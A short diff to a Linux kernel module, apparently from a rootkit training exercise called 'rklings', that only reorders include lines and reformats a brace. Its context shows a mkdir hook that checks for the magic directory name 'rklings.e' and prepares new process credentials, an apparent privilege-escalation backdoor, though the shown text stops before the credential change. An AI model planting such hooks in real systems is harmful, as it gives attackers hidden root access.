@@ -1,13 +1,14 @@
 // SPDX-License-Identifier: GPL-2.0
+#include "rklings_hook.h"
+#include <linux/cred.h>
 #include <linux/init.h>
 #include <linux/kernel.h>
 #include <linux/module.h>
-#include <linux/string.h>
-#include <linux/cred.h>
 #include <linux/sched/task.h>
-#include "rklings_hook.h"
+#include <linux/string.h>
 
-RK_ON_MKDIR(name) {
+RK_ON_MKDIR(name)
+{
 	struct cred *new_cred;
 
 	if (strcmp(name, "rklings.e") != 0)
